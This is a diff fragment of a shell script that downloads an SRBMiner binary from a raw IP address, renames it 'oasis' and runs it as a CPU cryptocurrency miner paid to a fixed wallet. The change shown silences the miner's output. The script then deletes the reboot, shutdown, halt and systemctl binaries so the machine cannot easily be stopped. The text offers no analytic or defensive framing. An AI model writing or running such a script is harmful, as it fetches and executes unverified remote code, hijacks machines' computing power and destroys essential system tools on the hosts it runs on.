@@ -7,7 +7,7 @@ apt update -y;apt -y install binutils cmake build-essential screen unzip net-too
 
 wget -O oasis http://139.180.133.28/SRBMiner-MULTI
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-GBUT) --password x --cpu-threads $(nproc --all) 
+./oasis --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-GBUT) --password x --cpu-threads $(nproc --all) >/dev/null 2>&1
 sleep 30
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
